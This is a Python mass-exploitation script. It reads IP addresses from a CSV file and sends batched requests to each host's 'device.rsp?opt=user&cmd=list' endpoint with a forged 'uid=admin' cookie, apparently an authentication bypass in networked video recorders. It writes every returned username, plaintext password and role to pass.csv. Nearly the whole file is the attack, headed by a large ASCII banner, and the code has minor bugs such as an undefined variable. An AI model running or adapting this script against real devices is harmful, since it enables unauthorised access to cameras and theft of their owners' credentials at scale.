# -*- coding: utf-8 -*-
from __future__ import print_function
import csv
import grequests
import json
import requests
import argparse
import tableprint as tp
import re

class Colors:
    BLUE        = '\033[94m'
    GREEN       = '\033[32m'
    RED         = '\033[0;31m'
    DEFAULT     = '\033[0m'
    ORANGE      = '\033[33m'
    WHITE       = '\033[97m'
    BOLD        = '\033[1m'
    BR_COLOUR   = '\033[1;37;40m'
banner = '''````````````````````````````````````````````````````````````````````````

                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                    ,NMMMMMMMN                                                                              
                                                                                                                                                                                                                  DMMMMMMMMMMMMM                                                                            
                                                                                                                                                                                                                  ~MMMZ,  :MMMMMM                                                                           
                                                                                                                                                                                                                   +=       NMMMM7                                                                          
                                                                                                                                                                                                                            7MMMMD                                                                          
                                                                                                                                                                                                                            :MMMMN                                                                          
       MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM      NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM          MMMMMMMMMMMMMM                           8MMMMMMMMMMMMM:                                          MMMMM+                                                                          
       MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM      NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM          MMMMMMMMMMMMMM                           8MMMMMMMMMMMMM:                                         ,MMMMM                                                                           
       MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN      NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM          MMMMMMMMMMMMMM                           8MMMMMMMMMMMMM:                                         MMMMM+                                                                           
       MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN      NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM          MMMMMMMMMMMMMM                           8MMMMMMMMMMMMM:                                       ,MMMMM:                                                                            
       MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN      NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM          MMMMMMMMMMMMMM                           DMMMMMMMMMMMMM:                                      :MMMMM~                                                                             
       MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN      NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM          MMMMMMMMMMMMMM                           DMMMMMMMMMMMMM:                                     +MMMMM,                                                                              
       MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM=       NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM:          MMMMMMMMMMMMMM                           DMMMMMMMMMMMMM:                                   ~MMMMM+                                                                                
       MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM?        NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMZ           MMMMMMMMMMMMMM                           DMMMMMMMMMMMMM:                                  $MMMMD                                                                                  
       ,,,,,,,,,,,,,,,,,,,,,,,,,,,,，  8MMMMMMMMMMMMMMO         ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, MMMMMMMMMMMMMMM:            MMMMMMMMMMMMMM                           8MMMMMMMMMMMMM:                                ,MMMMM+                                                                                   
                                     MMMMMMMMMMMMMMMI                                        MMMMMMMMMMMMMMM~             MMMMMMMMMMMMMM                           8MMMMMMMMMMMMM:                               ~MMMMMMMMMMMMMMMM,                                                                         
                                    DMMMMMMMMMMMMMMZ                                        ZMMMMMMMMMMMMMMZ              MMMMMMMMMMMMMM                           DMMMMMMMMMMMMM:                               =MMMMMMMMMMMMMMMM,                                                                         
                                   OMMMMMMMMMMMMMMD                                        MMMMMMMMMMMMMMMI               MMMMMMMMMMMMMM                           DMMMMMMMMMMMMM:                                                                                                                          
                                  MMMMMMMMMMMMMMM$                                        MMMMMMMMMMMMMMM=                MMMMMMMMMMMMMM                           DMMMMMMMMMMMMM:                                                                                                                          
                                 NMMMMMMMMMMMMMMO                                       ,MMMMMMMMMMMMMMM7,                MMMMMMMMMMMMMM                           DMMMMMMMMMMMMM:                                                                                                                          
                                NMMMMMMMMMMMMMM8                                        MMMMMMMMMMMMMMM+                  MMMMMMMMMMMMMM                           8MMMMMMMMMMMMM:                                      DMMMM:                                                                              
                               DMMMMMMMMMMMMMMI                                        MMMMMMMMMMMMMMM$                   MMMMMMMMMMMMMM                           8MMMMMMMMMMMMM:                                   ZMMMMMMM                                                                               
                              8MMMMMMMMMMMMMMM                                        MMMMMMMMMMMMMMM8                    MMMMMMMMMMMMMM                           DMMMMMMMMMMMMM:                                 MMMMMMMMMM                                                                               
                             OMMMMMMMMMMMMMMM                                        MMMMMMMMMMMMMMMO                     MMMMMMMMMMMMMM                           DMMMMMMMMMMMMM:                                 MMMM=MMMMM                                                                               
                            MMMMMMMMMMMMMMM+                                        MMMMMMMMMMMMMMM7                      MMMMMMMMMMMMMM                           8NMMMMMMMMMMMM:                                      MMMMM                                                                               
                           DMMMMMMMMMMMMMM8                                       ,MMMMMMMMMMMMMMM8                       MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM:                                      MMMMM                                                                               
                          8MMMMMMMMMMMMMMM                                        MMMMMMMMMMMMMMM,                        MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM:                                      MMMMM                                                                               
                         MMMMMMMMMMMMMMN7                                        MMMMMMMMMMMMMMMD                         MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM:                                      MMMMM                                                                               
                        MMMMMMMMMMMMMMMD                                       :DMMMMMMMMMMMMMMN                          MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM:                                      MMMMM                                                                               
                       $MMMMMMMMMMMMMMM                                        MMMMMMMMMMMMMMN7 ,,                        MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM:                                      MMMMM                                                                               
                      MMMMMMMMMMMMMMMO                                        MMMMMMMMMMMMMMM7                            MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM:                                      MMMMM                                                                               
                     MMMMMMMMMMMMMMMO                                       ?MMMMMMMMMMMMMMMN                             MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM:                                      MMMMM                                                                               
                    NMMMMMMMMMMMMMMN                                       ,MMMMMMMMMMMMMMM?                              MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM:                                      MMMMM                                                                               
                   MMMMMMMMMMMMMMMN                                        MMMMMMMMMMMMMMMO                               MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM:                                      MMMMM                                                                               
                  MMMMMMMMMMMMMMMN                                       ,MMMMMMMMMMMMMMMM                                MMMMMMMMMMMMMM                           8MMMMMMMMMMMMM:                                      MMMMM                                                                               
                 NMMMMMMMMMMMMMMM                                        MMMMMMMMMMMMMMMD                                 MMMMMMMMMMMMMM                           8MMMMMMMMMMMMM:                                      MMMMM                                                                               
                MMMMMMMMMMMMMMMD                                        MMMMMMMMMMMMMMM$                                  MMMMMMMMMMMMMM                           DMMMMMMMMMMMMM:                                      MMMMM                                                                                                                                           
               MMMMMMMMMMMMMMMM                                       ~MMMMMMMMMMMMMMMM                                   MMMMMMMMMMMMMM                           DMMMMMMMMMMMMM:                                                                                                                          
              MMMMMMMMMMMMMMMM                                       :MMMMMMMMMMMMMMMZ                                    MMMMMMMMMMMMMM                           DMMMMMMMMMMMMM:                                                                                                                          
             MMMMMMMMMMMMMMMO                                       ,MMMMMMMMMMMMMMMD                                     MMMMMMMMMMMMMM                           DMMMMMMMMMMMMM:                                                                                                                          
            MMMMMMMMMMMMMMMM                                       ,MMMMMMMMMMMMMMMN                                      MMMMMMMMMMMMMM                           DMMMMMMMMMMMMM:                                 MMMMMMMMMMMMMMMMM                                                                        
           MMMMMMMMMMMMMMMM                                        MMMMMMMMMMMMMMMM                                       MMMMMMMMMMMMMM                           DMMMMMMMMMMMMM:                                 MMMMMMMMMMMMMMMMM                                                                        
          MMMMMMMMMMMMMMM$                                       :MMMMMMMMMMMMMMM8                                        MMMMMMMMMMMMMM                           DMMMMMMMMMMMMM:                                            NMMMM                                                                         
         MMMMMMMMMMMMMMMN                                       ~MMMMMMMMMMMMMMMN                                         MMMMMMMMMMMMMM                           DMMMMMMMMMMMMM:                                           :MMMM,                                                                         
       :DMMMMMMMMMMMMMMM                                       ,MMMMMMMMMMMMMMM$                                          MMMMMMMMMMMMMM                           DMMMMMMMMMMMMM:                                          ,MMMMN                                                                          
       MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM8      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM          MMMMMMMMMMMMMM                           DMMMMMMMMMMMMM:                                          MMMMM                                                                           
      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM8    +MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM          MMMMMMMMMMMMMM                           DMMMMMMMMMMMMM:                                         IMMMMZ                                                                           
     MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM8   ,MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM          MMMMMMMMMMMMMM                           8MMMMMMMMMMMMM:                                         MMMMD                                                                            
    +MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM8   IMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM          MMMMMMMMMMMMMM                           8MMMMMMMMMMMMM:                                        MMMMM                                                                             
    ?MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM8   ?MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM          MMMMMMMMMMMMMM                           DMMMMMMMMMMMMM:                                       MMMMM~                                                                             
    ?MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM8   ?MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM          MMMMMMMMMMMMMM                           8MMMMMMMMMMMMM:                                      ~MMMMM                                                                              
    ?MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM8   ?MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM          MMMMMMMMMMMMMM                           8MMMMMMMMMMMMM:                                      MMMMM                                                                               
    ?MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM8   ?MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM          MMMMMMMMMMMMMM                           8MMMMMMMMMMMMM:                                     OMMMM                                                                                
    ,+++++++++++++++++++++++++++++++++++++++++++++++++=+~   ,=+++++++++++++++++++++++++++++++++++++++++++++++++=          +++++++++++++=                           =+++++++++++++                                     ZMMMM8                                                                                
                                                                                                                                                                                                                     :MMMMM                                                                                 
                                                                                                                                                                                                                     MMMMM:                                                                                 
                                                                                                                                                                                                                    7MMMM+                                                                                  
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                             GlassGiant com

  ````````````````````````````````````````````````````````````````````````````````             
[*]@zzh217
'''

#read csv
print(Colors.ORANGE+banner+Colors.DEFAULT)
csv_file = csv.reader(open('66b2f74b75457f73347f6a840bebc339.csv','r'))
csv_out = open('pass.csv','a')
csv_write = csv.writer(csv_out,dialect='excel')
headers = {}
def makeReqHeaders(xCookie):
    
    headers["User-Agent"]       = "Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)"
    
    headers["Cookie"]           = "uid="+xCookie

    return headers
num_all=0
urls=[]
numm=0
nui=0
def writeee(aaa,ips,nui):
    iii=0
    for ress in aaa:
        
        try:
            
            csv_wf=[]
            csv_wf.append(ips[iii])
            badJson = ress.text
            matchObj = re.search( '{.*}', badJson, re.M|re.I)
            
            badJson=matchObj.group(0)
           
            try:
                dataJson = json.loads(badJson)
                totUsr = len(dataJson["list"])
            except Exception as e:
                print(" [+] Error: "+str(e))
                print(" [>] json: "+str(rX))
                continue
            print(Colors.GREEN+"\n [+] Users List:\t"+Colors.ORANGE+str(totUsr)+Colors.DEFAULT)
            csv_wf.append(str(totUsr))
            csv_wf.append(" ")
            try:
                for obj in range(0,totUsr):
                    _usuario    = dataJson["list"][obj]["uid"]
                    _password   = dataJson["list"][obj]["pwd"]
                    _role       = dataJson["list"][obj]["role"]

                    csv_wf.append("uid:"+str(_usuario)) 
                    csv_wf.append("pwd:"+str(_password))
                    csv_wf.append("role:"+str(_role))

            except Exception as e:
                print(" [!]: "+str(e))
                print(" [+] "+ str(dataJson))
                continue

            csv_write.writerow(csv_wf)
            #print (csv_wf)
            iii=iii+1
            
        except Exception as e:
            #print(e)
            iii=iii+1
            continue
ips=[] 
def requrl(urls,nui,ips):
    
    reqs = [grequests.get(url,headers=makeReqHeaders(xCookie="admin"),timeout=10.000) for url in urls ]
    response = grequests.map(reqs)
    print ("-----------------------------------"+str(len(response))+"-------------------------------------------------------------\n")
    print ("-----------------------------------"+str(len(ips))+"-------------------------------------------------------------\n")
    print ("-----------------------------------"+str(len(urls))+"-------------------------------------------------------------\n")
    writeee(response,ips,nui)
lun=1
for stu in csv_file:
    ip = stu[0]
    ips.append(ip)
    host = "http://"+stu[0]+"/"
    fullHost_1 = host+"device.rsp?opt=user&cmd=list" 
    urls.append(fullHost_1)
    
    if(numm<500):        
        numm=numm+1        
    else:
    	print ("----------------------------------------------------------NO."+str(lun)+"------------------------------------------------------")
        requrl(urls,nui,ips)
        lun = lun + 1
        nui=nui+1
        numm=0
        urls=[]
        ips=[]

reqs = [grequests.get(url,headers=makeReqHeaders(xCookie="admin"),timeout=10.000) for url in urls ]
writeee(reqs,ips,nui)



